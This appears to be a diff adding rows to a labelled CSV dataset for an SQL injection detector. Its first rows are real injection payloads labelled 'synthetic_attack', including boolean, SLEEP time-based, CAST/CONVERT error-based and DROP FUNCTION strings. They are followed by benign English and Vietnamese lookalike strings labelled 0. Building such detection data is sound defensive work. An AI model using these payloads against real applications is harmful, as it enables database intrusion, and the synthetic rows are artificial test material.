+%'; IF(4501=4501) SELECT 4501 ELSE DROP FUNCTION DXYK--,1,synthetic_attack
+%'; IF(4542=4542) SELECT 4542 ELSE DROP FUNCTION TWbZ--,1,synthetic_attack
+%'; IF(6197=6197) SELECT 6197 ELSE DROP FUNCTION luAm--,1,synthetic_attack
+%'; IF(7614=7614) SELECT 7614 ELSE DROP FUNCTION QFPP--,1,synthetic_attack
+%'; IF(8224=8224) SELECT 8224 ELSE DROP FUNCTION NMqM--,1,synthetic_attack
+' AND 'xCuP'='xCuP' --,1,synthetic_attack
+' AND ('VYZV' LIKE 'VYZV,1,synthetic_attack
+' AND ('voyh' LIKE 'voyh,1,synthetic_attack
+' AND (CASE WHEN 4043=2305 THEN 4043 ELSE NULL END),1,synthetic_attack
+' AND (CASE WHEN 6028=1171 THEN 6028 ELSE NULL END),1,synthetic_attack
+' AND (SELECT 4119 FROM (SELECT(SLEEP(5)))x),1,synthetic_attack
+' AND (SELECT 9372 FROM (SELECT(SLEEP(4)))x),1,synthetic_attack
+' AND 1002=1002 ORDER BY 24--,1,synthetic_attack
+' AND 1009=1009 ORDER BY 22--,1,synthetic_attack
+' AND 1326=1326 AND (6384=6384,1,synthetic_attack
+"' AND 1500=LIKE('Fncf',UPPER(HEX(RANDOMBLOB(7550))))",1,synthetic_attack
+' AND 1977=1977 ORDER BY 1--,1,synthetic_attack
+' AND 1=1 #,1,synthetic_attack
+' AND 2376=2376 AND 'zjZD'='zjZD,1,synthetic_attack
+"' AND 3301=LIKE('PtpA',UPPER(HEX(RANDOMBLOB(4936))))",1,synthetic_attack
+"' AND 3659=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+' AND 4084=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+' AND 4344=9417 AND 'iktn'='wQoS,1,synthetic_attack
+' AND 4420=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+' AND 4599=4599 AND 'ZkJJ'='ZkJJ,1,synthetic_attack
+' AND 4762=(CASE WHEN (4762=4762) THEN 4762 ELSE 1/(SELECT 0) END),1,synthetic_attack
+"' AND 5341=LIKE('ayqV',UPPER(HEX(RANDOMBLOB(5054))))",1,synthetic_attack
+' AND 5361=5361 AND (6409=6409,1,synthetic_attack
+' AND 7492=8448 AND 'Mlbt'='KSXg,1,synthetic_attack
+"' AND 7880=CONVERT(INT,(SELECT CHAR(88)))--",1,synthetic_attack
+' AND 7918=(CASE WHEN (7918=7918) THEN 7918 ELSE 1/(SELECT 0) END),1,synthetic_attack
+' AND 8280=8280 ORDER BY 8#,1,synthetic_attack
+' AND 9304=9304 AND (4108=4108,1,synthetic_attack
+' AND 9426=3354 AND 'KmAM'='hjkH,1,synthetic_attack
+"' AND 9436=LIKE('QhWp',UPPER(HEX(RANDOMBLOB(9314))))",1,synthetic_attack
+' AND a='a,1,synthetic_attack
+' HAVING 0=0,1,synthetic_attack
+' HAVING 0=1,1,synthetic_attack
+' HAVING 1=0,1,synthetic_attack
+' HAVING 1=1,1,synthetic_attack
+' OR 'TnAY'='TnAY' --,1,synthetic_attack
+' OR ('PlVu' LIKE 'PlVu,1,synthetic_attack
+' OR ('fVGB' LIKE 'fVGB,1,synthetic_attack
+' OR ('hfwj' LIKE 'hfwj,1,synthetic_attack
+' OR ('qoHl' LIKE 'qoHl,1,synthetic_attack
+' OR (CASE WHEN 7614=6467 THEN 7614 ELSE NULL END),1,synthetic_attack
+' OR (SELECT 8218 FROM (SELECT(SLEEP(1)))x),1,synthetic_attack
+' OR 1724=1724 OR 'qcjD'='qcjD,1,synthetic_attack
+' OR 1=1 #,1,synthetic_attack
+' OR 3222=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+' OR 3362=3362 OR 'ymhS'='ymhS,1,synthetic_attack
+"' OR 3624=LIKE('xoYf',UPPER(HEX(RANDOMBLOB(7193))))",1,synthetic_attack
+' OR 3739=3739 ORDER BY 16#,1,synthetic_attack
+' OR 4116=4116 ORDER BY 21#,1,synthetic_attack
+' OR 4134=5063 OR 'epQh'='diHR,1,synthetic_attack
+' OR 4154=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+"' OR 5374=LIKE('HfTd',UPPER(HEX(RANDOMBLOB(4051))))",1,synthetic_attack
+' OR 5430=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+' OR 5862=CAST((CHR(1)||CHR(2))||(SELECT 1)::text AS NUMERIC),1,synthetic_attack
+' OR 6181=7022 OR 'KUCE'='RkjZ,1,synthetic_attack
+' OR 6636=(CASE WHEN (6636=6636) THEN 6636 ELSE 1/(SELECT 0) END),1,synthetic_attack
+' OR 6676=6676 OR (3501=3501,1,synthetic_attack
+' OR 7173=7173 OR (5167=5167,1,synthetic_attack
+"' OR 7435=LIKE('lIGW',UPPER(HEX(RANDOMBLOB(2390))))",1,synthetic_attack
+' OR 8142=7835 OR 'rKUd'='RFSf,1,synthetic_attack
+' OR 8148=5031 OR 'UNQm'='gXfj,1,synthetic_attack
+1 + 51 = 3,0,synthetic_benign2
+1 = 19 - 68,0,synthetic_benign2
+1 > 35 or 35 > 1,0,synthetic_benign2
+1 hoặc 42 người đi cùng gói cước,0,synthetic_benign2
+1 hoặc 64 người đi cùng Minh,0,synthetic_benign2
+1 or 88 guests are coming,0,synthetic_benign2
+10 > 11 or 11 > 10,0,synthetic_benign2
+10 hoặc 10 người đi cùng menu,0,synthetic_benign2
+10 hoặc 47 người đi cùng Bình,0,synthetic_benign2
+10 or 10 cái cũng được,0,synthetic_benign2
+10 or 14 guests are coming,0,synthetic_benign2
+10 or 34 guests are coming,0,synthetic_benign2
+10 or 36 cái cũng được,0,synthetic_benign2
+10 or 48 guests are coming,0,synthetic_benign2
+100 = 19 - 56,0,synthetic_benign2
+101 = 56 - 13,0,synthetic_benign2
+103 = 26 - 37,0,synthetic_benign2
+105 = 9 - 42,0,synthetic_benign2
+105 = 91 - 42,0,synthetic_benign2
+11 + 60 = 68,0,synthetic_benign2
+11 or 25 guests are coming,0,synthetic_benign2
+111 = 17 - 30,0,synthetic_benign2
+116 = 65 - 22,0,synthetic_benign2
+117 = 62 - 41,0,synthetic_benign2
+119 = 4 - 33,0,synthetic_benign2
+12 + 84 = 176,0,synthetic_benign2
+12 hoặc 5 người đi cùng bàn 4,0,synthetic_benign2
+12 hoặc 83 người đi cùng đơn hàng,0,synthetic_benign2
+12 or 99 guests are coming,0,synthetic_benign2
+122 = 33 - 71,0,synthetic_benign2
+124 = 88 - 46,0,synthetic_benign2
+12x60cm; phòng 305 and vé xe,0,synthetic_benign2
+13 = 82 - 18,0,synthetic_benign2
+13 or 27 guests are coming,0,synthetic_benign2
+13 or 61 guests are coming,0,synthetic_benign2
+13 or 99 guests are coming,0,synthetic_benign2
+132 = 56 - 9,0,synthetic_benign2
+137 = 59 - 15,0,synthetic_benign2
+138 = 54 - 57,0,synthetic_benign2
+13x38cm; bàn 4 and gói cước,0,synthetic_benign2
+13x60cm; phòng 305 and Minh,0,synthetic_benign2
+13x80cm; gói cước and Minh,0,synthetic_benign2
+14 + 63 = 84,0,synthetic_benign2
+14 > 53 or 53 > 14,0,synthetic_benign2
+14 > 86 or 86 > 14,0,synthetic_benign2
+14 hoặc 25 người đi cùng phòng 305,0,synthetic_benign2
+14 hoặc 77 người đi cùng gói cước,0,synthetic_benign2
+14 or 70 guests are coming,0,synthetic_benign2
+140 = 43 - 46,0,synthetic_benign2
+142 = 10 - 47,0,synthetic_benign2
+145 = 85 - 72,0,synthetic_benign2
+146 = 34 - 68,0,synthetic_benign2
+148 = 55 - 35,0,synthetic_benign2
+149 = 24 - 88,0,synthetic_benign2
+15 > 31 or 31 > 15,0,synthetic_benign2
+15 hoặc 76 người đi cùng size M,0,synthetic_benign2
+15 hoặc 80 người đi cùng Hà Nội,0,synthetic_benign2
+15 or 60 guests are coming,0,synthetic_benign2
+155 = 18 - 97,0,synthetic_benign2
+158 = 26 - 3,0,synthetic_benign2
+15x20cm; ca sáng and kế hoạch Q4,0,synthetic_benign2
+15x33cm; vé xe and bàn 4,0,synthetic_benign2
+15x52cm; giày nam and sách,0,synthetic_benign2
+16 + 56 = 53,0,synthetic_benign2
+16 + 91 = 15,0,synthetic_benign2
+16 or 12 guests are coming,0,synthetic_benign2
+16 or 36 guests are coming,0,synthetic_benign2
+16 or 41 guests are coming,0,synthetic_benign2
+16 or 46 cái cũng được,0,synthetic_benign2
+160 = 86 - 53,0,synthetic_benign2
+164 = 51 - 22,0,synthetic_benign2
+164 = 79 - 95,0,synthetic_benign2
+167 = 76 - 69,0,synthetic_benign2
+16x21cm; cà phê and ca sáng,0,synthetic_benign2
+16x21cm; kế hoạch Q4 and Bình,0,synthetic_benign2
+17 hoặc 62 người đi cùng ca sáng,0,synthetic_benign2
+17 or 91 cái cũng được,0,synthetic_benign2
+170 = 49 - 33,0,synthetic_benign2
+172 = 56 - 46,0,synthetic_benign2
+174 = 10 - 28,0,synthetic_benign2
+176 = 67 - 93,0,synthetic_benign2
+17x74cm; áo thun and ca sáng,0,synthetic_benign2
+18 + 56 = 122,0,synthetic_benign2
+18 + 82 = 39,0,synthetic_benign2
+18 > 18 or 18 > 18,0,synthetic_benign2
+18 hoặc 20 người đi cùng menu,0,synthetic_benign2
+18 or 17 cái cũng được,0,synthetic_benign2
+18 or 26 cái cũng được,0,synthetic_benign2
+18 or 6 guests are coming,0,synthetic_benign2
+18 or 91 guests are coming,0,synthetic_benign2
+181 = 56 - 65,0,synthetic_benign2
+181 = 59 - 93,0,synthetic_benign2
+184 = 80 - 86,0,synthetic_benign2
+185 = 91 - 42,0,synthetic_benign2
+18x6cm; đơn hàng and An,0,synthetic_benign2
+19 = 54 - 64,0,synthetic_benign2
+19 hoặc 1 người đi cùng phòng 305,0,synthetic_benign2
+19 hoặc 13 người đi cùng O'Hara,0,synthetic_benign2
+19 hoặc 79 người đi cùng giày nam,0,synthetic_benign2
+19 hoặc 91 người đi cùng Hà Nội,0,synthetic_benign2
+19 or 71 guests are coming,0,synthetic_benign2
+19 or 88 guests are coming,0,synthetic_benign2
+19 or 89 cái cũng được,0,synthetic_benign2
+191 = 83 - 73,0,synthetic_benign2
+193 = 37 - 78,0,synthetic_benign2
+194 = 92 - 44,0,synthetic_benign2
+196 = 39 - 83,0,synthetic_benign2
+196 = 53 - 98,0,synthetic_benign2
+197 = 89 - 84,0,synthetic_benign2
+197 = 99 - 44,0,synthetic_benign2
+19x96cm; Hà Nội and size M,0,synthetic_benign2
+1x58cm; vé xe and Bình,0,synthetic_benign2
+2 = 15 - 10,0,synthetic_benign2
+2 > 26 or 26 > 2,0,synthetic_benign2
+2 > 4 or 4 > 2,0,synthetic_benign2
+2 > 60 or 60 > 2,0,synthetic_benign2
+2 > 77 or 77 > 2,0,synthetic_benign2
+2 hoặc 35 người đi cùng gói cước,0,synthetic_benign2
+2 hoặc 59 người đi cùng size M,0,synthetic_benign2
+2 or 41 cái cũng được,0,synthetic_benign2
+2 or 54 cái cũng được,0,synthetic_benign2
+2 or 56 guests are coming,0,synthetic_benign2
+20 + 11 = 190,0,synthetic_benign2
+20 + 49 = 62,0,synthetic_benign2
+20 + 62 = 161,0,synthetic_benign2
+20 > 11 or 11 > 20,0,synthetic_benign2
+20 hoặc 54 người đi cùng Lan,0,synthetic_benign2
+20 or 37 guests are coming,0,synthetic_benign2
+20 or 54 cái cũng được,0,synthetic_benign2
+20x98cm; Minh and đơn hàng,0,synthetic_benign2
+21 + 31 = 154,0,synthetic_benign2
+21 + 93 = 41,0,synthetic_benign2
+21 or 15 guests are coming,0,synthetic_benign2
+21 or 69 guests are coming,0,synthetic_benign2
+22 > 92 or 92 > 22,0,synthetic_benign2
+22 > 93 or 93 > 22,0,synthetic_benign2
+22 hoặc 18 người đi cùng O'Hara,0,synthetic_benign2
+22 hoặc 65 người đi cùng size M,0,synthetic_benign2
+22 or 33 guests are coming,0,synthetic_benign2
+22 or 64 cái cũng được,0,synthetic_benign2
+22x78cm; vé xe and An,0,synthetic_benign2
+23 + 53 = 73,0,synthetic_benign2
+23 = 78 - 19,0,synthetic_benign2
+23 > 27 or 27 > 23,0,synthetic_benign2
+23 > 41 or 41 > 23,0,synthetic_benign2
+23 hoặc 3 người đi cùng vé xe,0,synthetic_benign2
+23 hoặc 40 người đi cùng sách,0,synthetic_benign2
+23 or 73 guests are coming,0,synthetic_benign2
+23 or 80 guests are coming,0,synthetic_benign2
+23x2cm; giày nam and An,0,synthetic_benign2
+24 + 82 = 61,0,synthetic_benign2
+24 > 64 or 64 > 24,0,synthetic_benign2
+24 or 32 guests are coming,0,synthetic_benign2
+24x13cm; trà sữa and trà sữa,0,synthetic_benign2
+24x48cm; phòng 305 and áo thun,0,synthetic_benign2
+25 + 36 = 132,0,synthetic_benign2
+25 = 97 - 44,0,synthetic_benign2
+25 > 13 or 13 > 25,0,synthetic_benign2
+25 > 73 or 73 > 25,0,synthetic_benign2
+25 hoặc 40 người đi cùng phòng 305,0,synthetic_benign2
+25 or 41 cái cũng được,0,synthetic_benign2
+25 or 42 cái cũng được,0,synthetic_benign2
+26 + 28 = 9,0,synthetic_benign2
+26 + 87 = 140,0,synthetic_benign2
+26 or 9 guests are coming,0,synthetic_benign2
+27 + 92 = 5,0,synthetic_benign2
+27 = 56 - 61,0,synthetic_benign2
+27 > 31 or 31 > 27,0,synthetic_benign2
+27 > 51 or 51 > 27,0,synthetic_benign2
+27 hoặc 26 người đi cùng menu,0,synthetic_benign2
+27 hoặc 93 người đi cùng vé xe,0,synthetic_benign2
+27 hoặc 99 người đi cùng size M,0,synthetic_benign2
+27 or 26 guests are coming,0,synthetic_benign2
+27 or 82 cái cũng được,0,synthetic_benign2
+27x69cm; cà phê and đơn hàng,0,synthetic_benign2
+28 + 66 = 128,0,synthetic_benign2
+28 > 15 or 15 > 28,0,synthetic_benign2
+28 > 59 or 59 > 28,0,synthetic_benign2
+28 > 71 or 71 > 28,0,synthetic_benign2
+28 > 78 or 78 > 28,0,synthetic_benign2
+28 hoặc 56 người đi cùng vé xe,0,synthetic_benign2
+29 + 28 = 148,0,synthetic_benign2
+29 hoặc 37 người đi cùng An,0,synthetic_benign2
+29 or 23 cái cũng được,0,synthetic_benign2
+29 or 50 guests are coming,0,synthetic_benign2
+3 > 3 or 3 > 3,0,synthetic_benign2
+3 > 58 or 58 > 3,0,synthetic_benign2
+3 > 76 or 76 > 3,0,synthetic_benign2
+3 hoặc 16 người đi cùng menu,0,synthetic_benign2
+3 hoặc 85 người đi cùng bàn 4,0,synthetic_benign2
+3 or 5 cái cũng được,0,synthetic_benign2
+3 or 53 cái cũng được,0,synthetic_benign2
+3 or 77 guests are coming,0,synthetic_benign2
+3 or 9 guests are coming,0,synthetic_benign2
+30 hoặc 54 người đi cùng An,0,synthetic_benign2
+30 or 14 cái cũng được,0,synthetic_benign2
+30 or 49 cái cũng được,0,synthetic_benign2
+30x25cm; Hà Nội and áo thun,0,synthetic_benign2
+31 + 91 = 137,0,synthetic_benign2
+31 > 28 or 28 > 31,0,synthetic_benign2
+31 > 59 or 59 > 31,0,synthetic_benign2
+31 > 85 or 85 > 31,0,synthetic_benign2
+31 or 99 cái cũng được,0,synthetic_benign2
+31x69cm; cà phê and sách,0,synthetic_benign2
+32 = 1 - 89,0,synthetic_benign2
+32 or 83 guests are coming,0,synthetic_benign2
+33 or 54 guests are coming,0,synthetic_benign2
+33 or 56 cái cũng được,0,synthetic_benign2
+33 or 75 cái cũng được,0,synthetic_benign2
+33x41cm; gói cước and Hà Nội,0,synthetic_benign2
+34 = 98 - 49,0,synthetic_benign2
+34 > 63 or 63 > 34,0,synthetic_benign2
+34 > 72 or 72 > 34,0,synthetic_benign2
+34 > 82 or 82 > 34,0,synthetic_benign2
+34x89cm; size M and gói cước,0,synthetic_benign2
+34x8cm; gói cước and giày nam,0,synthetic_benign2
+35 hoặc 86 người đi cùng kế hoạch Q4,0,synthetic_benign2
+36 + 14 = 121,0,synthetic_benign2
+36 = 11 - 12,0,synthetic_benign2
+36 > 4 or 4 > 36,0,synthetic_benign2
+36 or 78 guests are coming,0,synthetic_benign2
+37 + 28 = 103,0,synthetic_benign2
+37 + 46 = 162,0,synthetic_benign2
+37 + 57 = 197,0,synthetic_benign2
+37 + 63 = 12,0,synthetic_benign2
+37 + 77 = 157,0,synthetic_benign2
+37 > 82 or 82 > 37,0,synthetic_benign2
+37 hoặc 94 người đi cùng trà sữa,0,synthetic_benign2
+37 or 26 cái cũng được,0,synthetic_benign2
+37 or 67 guests are coming,0,synthetic_benign2
+38 hoặc 37 người đi cùng cà phê,0,synthetic_benign2
+38 hoặc 82 người đi cùng phòng 305,0,synthetic_benign2
+38 or 16 guests are coming,0,synthetic_benign2
+39 + 15 = 116,0,synthetic_benign2
+39 = 61 - 57,0,synthetic_benign2
+39 = 79 - 61,0,synthetic_benign2
+39 or 12 cái cũng được,0,synthetic_benign2
+39 or 92 cái cũng được,0,synthetic_benign2
+39x9cm; sách and kế hoạch Q4,0,synthetic_benign2
+3x39cm; cà phê and Hà Nội,0,synthetic_benign2
+3x44cm; menu and An,0,synthetic_benign2
+4 > 14 or 14 > 4,0,synthetic_benign2
+4 > 62 or 62 > 4,0,synthetic_benign2
+4 hoặc 57 người đi cùng sách,0,synthetic_benign2
+4 or 23 cái cũng được,0,synthetic_benign2
+4 or 38 cái cũng được,0,synthetic_benign2
+4 or 62 guests are coming,0,synthetic_benign2
+40 + 41 = 41,0,synthetic_benign2
+40 + 99 = 78,0,synthetic_benign2
+40 or 52 cái cũng được,0,synthetic_benign2
+40 or 9 cái cũng được,0,synthetic_benign2
+41 = 40 - 59,0,synthetic_benign2
+41 > 78 or 78 > 41,0,synthetic_benign2
+41 hoặc 92 người đi cùng Lan,0,synthetic_benign2
+41 or 28 cái cũng được,0,synthetic_benign2
+41 or 47 cái cũng được,0,synthetic_benign2
+41 or 60 cái cũng được,0,synthetic_benign2
+41 or 73 guests are coming,0,synthetic_benign2
+41 or 82 cái cũng được,0,synthetic_benign2
+41 or 93 cái cũng được,0,synthetic_benign2
+42 + 45 = 22,0,synthetic_benign2
+42 > 49 or 49 > 42,0,synthetic_benign2
+42 or 11 guests are coming,0,synthetic_benign2
+42 or 80 guests are coming,0,synthetic_benign2
+42 or 82 guests are coming,0,synthetic_benign2
+42x91cm; cà phê and size M,0,synthetic_benign2
+43 + 35 = 82,0,synthetic_benign2
+43 + 42 = 172,0,synthetic_benign2
+43 > 38 or 38 > 43,0,synthetic_benign2
+43 > 97 or 97 > 43,0,synthetic_benign2
+43 hoặc 16 người đi cùng ca sáng,0,synthetic_benign2
+43 hoặc 80 người đi cùng Lan,0,synthetic_benign2
+43 or 18 cái cũng được,0,synthetic_benign2
+43 or 50 cái cũng được,0,synthetic_benign2
+43 or 57 cái cũng được,0,synthetic_benign2
+43 or 65 guests are coming,0,synthetic_benign2
+43x55cm; kế hoạch Q4 and vé xe,0,synthetic_benign2
+44 + 25 = 86,0,synthetic_benign2
+44 + 49 = 142,0,synthetic_benign2
+44 + 52 = 100,0,synthetic_benign2
+44 + 57 = 50,0,synthetic_benign2
+44 + 81 = 177,0,synthetic_benign2
+44 > 47 or 47 > 44,0,synthetic_benign2
+44 or 79 cái cũng được,0,synthetic_benign2
+45 + 26 = 41,0,synthetic_benign2
+45 or 91 guests are coming,0,synthetic_benign2
+45x88cm; cà phê and bàn 4,0,synthetic_benign2
+46x11cm; O'Hara and Minh,0,synthetic_benign2
+46x74cm; gói cước and size M,0,synthetic_benign2
+46x8cm; ca sáng and An,0,synthetic_benign2
+47 = 19 - 89,0,synthetic_benign2
+47 > 95 or 95 > 47,0,synthetic_benign2
+47 or 1 cái cũng được,0,synthetic_benign2
+47 or 10 guests are coming,0,synthetic_benign2
+47 or 47 cái cũng được,0,synthetic_benign2
+47 or 59 cái cũng được,0,synthetic_benign2
+47 or 73 guests are coming,0,synthetic_benign2
+47x79cm; O'Hara and menu,0,synthetic_benign2
+48 + 60 = 147,0,synthetic_benign2
+48 > 50 or 50 > 48,0,synthetic_benign2
+48 hoặc 45 người đi cùng Minh,0,synthetic_benign2
+48 hoặc 83 người đi cùng kế hoạch Q4,0,synthetic_benign2
+48x26cm; size M and cà phê,0,synthetic_benign2
+48x79cm; bàn 4 and phòng 305,0,synthetic_benign2
+5 + 92 = 126,0,synthetic_benign2
+5 or 64 cái cũng được,0,synthetic_benign2
+50 + 18 = 59,0,synthetic_benign2
+50 + 20 = 174,0,synthetic_benign2
+50 = 33 - 72,0,synthetic_benign2
+50 > 28 or 28 > 50,0,synthetic_benign2
+50 or 12 guests are coming,0,synthetic_benign2
+50 or 47 cái cũng được,0,synthetic_benign2
+50 or 53 cái cũng được,0,synthetic_benign2
+50 or 69 cái cũng được,0,synthetic_benign2
+51 + 21 = 95,0,synthetic_benign2
+51 + 54 = 138,0,synthetic_benign2
+51 + 86 = 188,0,synthetic_benign2
+51 = 19 - 45,0,synthetic_benign2
+51 = 5 - 72,0,synthetic_benign2
+51 > 40 or 40 > 51,0,synthetic_benign2
+51 > 62 or 62 > 51,0,synthetic_benign2
+51 > 66 or 66 > 51,0,synthetic_benign2
+51 > 79 or 79 > 51,0,synthetic_benign2
+51 hoặc 77 người đi cùng giày nam,0,synthetic_benign2
+51 or 46 guests are coming,0,synthetic_benign2
+52 > 70 or 70 > 52,0,synthetic_benign2
+52 hoặc 32 người đi cùng Lan,0,synthetic_benign2
+52x46cm; An and áo thun,0,synthetic_benign2
+53 + 78 = 46,0,synthetic_benign2
+53 + 79 = 33,0,synthetic_benign2
+53 hoặc 12 người đi cùng gói cước,0,synthetic_benign2
+53 or 22 guests are coming,0,synthetic_benign2
+53 or 29 cái cũng được,0,synthetic_benign2
+53 or 32 guests are coming,0,synthetic_benign2
+53x73cm; sách and menu,0,synthetic_benign2
+53x74cm; áo thun and cà phê,0,synthetic_benign2
+54 = 98 - 59,0,synthetic_benign2
+54 > 55 or 55 > 54,0,synthetic_benign2
+54 or 35 cái cũng được,0,synthetic_benign2
+54x12cm; trà sữa and O'Hara,0,synthetic_benign2
+54x63cm; Bình and Bình,0,synthetic_benign2
+55 + 45 = 127,0,synthetic_benign2
+55 > 71 or 71 > 55,0,synthetic_benign2
+55 hoặc 79 người đi cùng Lan,0,synthetic_benign2
+56 + 15 = 96,0,synthetic_benign2
+56 + 26 = 69,0,synthetic_benign2
+56 > 78 or 78 > 56,0,synthetic_benign2
+56 hoặc 77 người đi cùng Bình,0,synthetic_benign2
+56 or 10 cái cũng được,0,synthetic_benign2
+56 or 16 cái cũng được,0,synthetic_benign2
+56 or 17 guests are coming,0,synthetic_benign2
+56 or 53 guests are coming,0,synthetic_benign2
+56x2cm; bàn 4 and gói cước,0,synthetic_benign2
+57 + 40 = 104,0,synthetic_benign2
+57 + 99 = 179,0,synthetic_benign2
+57 = 2 - 57,0,synthetic_benign2
+57 > 58 or 58 > 57,0,synthetic_benign2
+57 or 15 cái cũng được,0,synthetic_benign2
+57 or 57 cái cũng được,0,synthetic_benign2
+57 or 7 cái cũng được,0,synthetic_benign2
+57x3cm; trà sữa and An,0,synthetic_benign2
+58 = 50 - 61,0,synthetic_benign2
+58 hoặc 11 người đi cùng Minh,0,synthetic_benign2
+58 hoặc 81 người đi cùng áo thun,0,synthetic_benign2
+58x78cm; cà phê and Bình,0,synthetic_benign2
+59 > 21 or 21 > 59,0,synthetic_benign2
+59 > 87 or 87 > 59,0,synthetic_benign2
+59 or 19 cái cũng được,0,synthetic_benign2
+5x36cm; trà sữa and trà sữa,0,synthetic_benign2
+6 + 47 = 158,0,synthetic_benign2
+6 > 18 or 18 > 6,0,synthetic_benign2
+6 > 79 or 79 > 6,0,synthetic_benign2
+6 hoặc 87 người đi cùng O'Hara,0,synthetic_benign2
+60 + 41 = 166,0,synthetic_benign2
+60 = 17 - 88,0,synthetic_benign2
+60 = 18 - 32,0,synthetic_benign2
+60 = 88 - 91,0,synthetic_benign2
+60 > 87 or 87 > 60,0,synthetic_benign2
+60 hoặc 20 người đi cùng áo thun,0,synthetic_benign2
+60x28cm; Hà Nội and Minh,0,synthetic_benign2
+60x88cm; Lan and đơn hàng,0,synthetic_benign2
+61 = 67 - 34,0,synthetic_benign2
+61 = 84 - 44,0,synthetic_benign2
+61 = 86 - 43,0,synthetic_benign2
+61 hoặc 89 người đi cùng O'Hara,0,synthetic_benign2
+61 or 27 guests are coming,0,synthetic_benign2
+61 or 44 cái cũng được,0,synthetic_benign2
+61x67cm; phòng 305 and kế hoạch Q4,0,synthetic_benign2
+62 + 52 = 5,0,synthetic_benign2
+62 = 38 - 24,0,synthetic_benign2
+62 > 46 or 46 > 62,0,synthetic_benign2
+62 > 5 or 5 > 62,0,synthetic_benign2
+62 > 51 or 51 > 62,0,synthetic_benign2
+62 hoặc 62 người đi cùng sách,0,synthetic_benign2
+62 hoặc 89 người đi cùng Bình,0,synthetic_benign2
+62 or 31 guests are coming,0,synthetic_benign2
+62 or 53 guests are coming,0,synthetic_benign2
+62 or 55 guests are coming,0,synthetic_benign2
+62 or 79 guests are coming,0,synthetic_benign2
+62 or 80 cái cũng được,0,synthetic_benign2
+62 or 84 cái cũng được,0,synthetic_benign2
+63 + 71 = 37,0,synthetic_benign2
+63 > 33 or 33 > 63,0,synthetic_benign2
+63 > 34 or 34 > 63,0,synthetic_benign2
+63 > 98 or 98 > 63,0,synthetic_benign2
+63 or 47 guests are coming,0,synthetic_benign2
+63x54cm; An and O'Hara,0,synthetic_benign2
+63x69cm; áo thun and ca sáng,0,synthetic_benign2
+64 + 48 = 80,0,synthetic_benign2
+64 hoặc 33 người đi cùng menu,0,synthetic_benign2
+64 hoặc 55 người đi cùng gói cước,0,synthetic_benign2
+64 or 5 cái cũng được,0,synthetic_benign2
+65 + 49 = 92,0,synthetic_benign2
+65 hoặc 93 người đi cùng ca sáng,0,synthetic_benign2
+65x39cm; Hà Nội and Bình,0,synthetic_benign2
+66 + 34 = 58,0,synthetic_benign2
+66 + 58 = 69,0,synthetic_benign2
+66 > 41 or 41 > 66,0,synthetic_benign2
+67 + 71 = 173,0,synthetic_benign2
+67 hoặc 44 người đi cùng menu,0,synthetic_benign2
+67 hoặc 5 người đi cùng sách,0,synthetic_benign2
+67 hoặc 70 người đi cùng trà sữa,0,synthetic_benign2
+68 + 24 = 103,0,synthetic_benign2
+68 + 30 = 12,0,synthetic_benign2
+68 + 88 = 86,0,synthetic_benign2
+68 > 16 or 16 > 68,0,synthetic_benign2
+68 > 18 or 18 > 68,0,synthetic_benign2
+68 hoặc 22 người đi cùng ca sáng,0,synthetic_benign2
+68 or 60 cái cũng được,0,synthetic_benign2
+69 + 38 = 74,0,synthetic_benign2
+69 + 87 = 26,0,synthetic_benign2
+69 hoặc 22 người đi cùng giày nam,0,synthetic_benign2
+69 hoặc 79 người đi cùng giày nam,0,synthetic_benign2
+69 or 14 guests are coming,0,synthetic_benign2
+69 or 7 cái cũng được,0,synthetic_benign2
+69x92cm; bàn 4 and size M,0,synthetic_benign2
+69x94cm; An and áo thun,0,synthetic_benign2
+7 + 77 = 121,0,synthetic_benign2
+7 > 69 or 69 > 7,0,synthetic_benign2
+7 hoặc 1 người đi cùng trà sữa,0,synthetic_benign2
+7 or 17 cái cũng được,0,synthetic_benign2
+7 or 29 cái cũng được,0,synthetic_benign2
+70 > 78 or 78 > 70,0,synthetic_benign2
+71 + 43 = 110,0,synthetic_benign2
+71 > 48 or 48 > 71,0,synthetic_benign2
+71 hoặc 1 người đi cùng trà sữa,0,synthetic_benign2
+71 or 40 guests are coming,0,synthetic_benign2
+71 or 72 guests are coming,0,synthetic_benign2
+71 or 85 guests are coming,0,synthetic_benign2
+71x55cm; vé xe and bàn 4,0,synthetic_benign2
+72 + 96 = 5,0,synthetic_benign2
+72 > 35 or 35 > 72,0,synthetic_benign2
+72 > 99 or 99 > 72,0,synthetic_benign2
+72 hoặc 4 người đi cùng An,0,synthetic_benign2
+72 hoặc 7 người đi cùng bàn 4,0,synthetic_benign2
+72 or 38 guests are coming,0,synthetic_benign2
+72 or 63 cái cũng được,0,synthetic_benign2
+72x63cm; size M and đơn hàng,0,synthetic_benign2
+73 + 21 = 48,0,synthetic_benign2
+73 + 28 = 111,0,synthetic_benign2
+73 + 62 = 57,0,synthetic_benign2
+73 + 96 = 118,0,synthetic_benign2
+73 = 69 - 10,0,synthetic_benign2
+73 > 11 or 11 > 73,0,synthetic_benign2
+73 > 12 or 12 > 73,0,synthetic_benign2
+73 > 20 or 20 > 73,0,synthetic_benign2
+73 or 39 cái cũng được,0,synthetic_benign2
+73 or 69 cái cũng được,0,synthetic_benign2
+73x61cm; sách and menu,0,synthetic_benign2
+73x75cm; giày nam and size M,0,synthetic_benign2
+74 + 22 = 127,0,synthetic_benign2
+74 + 36 = 89,0,synthetic_benign2
+74 + 93 = 178,0,synthetic_benign2
+74 > 13 or 13 > 74,0,synthetic_benign2
+74 > 57 or 57 > 74,0,synthetic_benign2
+74 > 65 or 65 > 74,0,synthetic_benign2
+74 > 96 or 96 > 74,0,synthetic_benign2
+74 hoặc 55 người đi cùng size M,0,synthetic_benign2
+74 or 1 guests are coming,0,synthetic_benign2
+74 or 28 guests are coming,0,synthetic_benign2
+74 or 60 cái cũng được,0,synthetic_benign2
+74x97cm; giày nam and size M,0,synthetic_benign2
+75 + 30 = 197,0,synthetic_benign2
+75 > 6 or 6 > 75,0,synthetic_benign2
+75 > 94 or 94 > 75,0,synthetic_benign2
+75 hoặc 19 người đi cùng O'Hara,0,synthetic_benign2
+75 or 14 cái cũng được,0,synthetic_benign2
